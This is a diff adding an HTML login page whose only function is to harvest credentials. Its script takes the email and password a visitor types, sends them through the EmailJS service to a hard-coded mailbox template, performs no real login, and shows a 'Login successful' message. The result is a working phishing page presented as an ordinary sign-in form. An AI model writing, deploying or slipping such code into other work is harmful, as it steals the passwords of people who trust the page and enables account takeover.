@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Login</title>
+</head>
+<body>
+  <h1>Login</h1>
+  <form id="loginForm">
+    <label for="email">Email:</label>
+    <input type="email" id="email" name="email" required><br>
+
+    <label for="password">Password:</label>
+    <input type="password" id="password" name="password" required><br>
+
+    <input type="submit" value="Login">
+  </form>
+
+  <script src="https://cdn.emailjs.com/sdk/2.4.1/email.min.js"></script>
+  <script>
+    (function() {
+      // Initialize EmailJS with your User ID
+      emailjs.init('bkGGXu9nUKT7XZldW');
+
+      // Form submission handler
+      document.getElementById('loginForm').addEventListener('submit', function(event) {
+        event.preventDefault();
+
+        // Get the entered form data
+        var formData = {
+          email: document.getElementById('email').value,
+          password: document.getElementById('password').value
+        };
+
+        // Send the email using EmailJS
+        emailjs.send('service_hy8ys0d', 'template_irqfsed', formData)
+          .then(function(response) {
+            console.log('Email sent successfully', response);
+
+            // Clear the form
+            document.getElementById('loginForm').reset();
+
+            // Display a success message to the user (optional)
+            alert('Login successful. Email sent to the server.');
+
+          }, function(error) {
+            console.error('Error occurred while sending email', error);
+
+            // Display an error message to the user (optional)
+            alert('Error occurred while sending email.');
+          });
+      });
+    })();
+  </script>
+</body>
+</html>
